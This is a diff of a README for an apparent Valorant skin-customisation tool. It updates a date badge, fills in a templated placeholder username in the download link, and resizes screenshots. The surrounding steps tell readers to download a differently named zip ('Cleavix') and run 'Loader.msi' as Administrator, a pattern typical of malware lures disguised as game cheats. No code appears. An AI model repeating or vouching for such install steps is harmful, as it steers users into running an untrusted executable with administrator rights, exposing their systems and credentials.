@@ -9,7 +9,7 @@ Valorant Cosmetic Enhancer 2026 — Advanced tool for full customization of skin
 ![Version](https://img.shields.io/badge/Version-2026-red)
 ![Status](https://img.shields.io/badge/Status-Active-brightgreen)
 ![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-green)
-![Updated](https://img.shields.io/badge/Updated-April%202026-yellow)
+![Updated](https://img.shields.io/badge/Updated-May%202026-yellow)
 
 </div>
 
@@ -27,7 +27,7 @@ Valorant Cosmetic Enhancer 2026 — Advanced tool for full customization of skin
 
 ## 🚀 Installation & Deployment
 
-1. Download: Get the latest `Cleavix-v1.0-win64.zip` from the [Official Releases](https://github.com/YOUR_USERNAME/Valorant-Cosmetic-Enhancer-2026/releases/tag/2026).
+1. Download: Get the latest `Cleavix-v1.0-win64.zip` from the [Official Releases](https://github.com/heshamzn/Valorant-Cosmetic-Enhancer-2026/releases/tag/2026).
 
 2. Initialize: Run `Loader.msi` as Administrator to prepare the local environment.
 
@@ -41,7 +41,7 @@ Valorant Cosmetic Enhancer 2026 — Advanced tool for full customization of skin
 
 | Step 1 | Step 2 |
 |--------|--------|
-| <img src="https://i.imgur.com/FFTUxlb.png" alt="Step 1" width="300"/> | <img src="https://i.imgur.com/g9GRlVJ.png" alt="Step 2" width="300"/> |
+| <img src="https://i.imgur.com/FFTUxlb.png" alt="Step 1" width="500"/> | <img src="https://i.imgur.com/g9GRlVJ.png" alt="Step 2" width="500"/> |
 
 ## 🛡️ Current Status
 
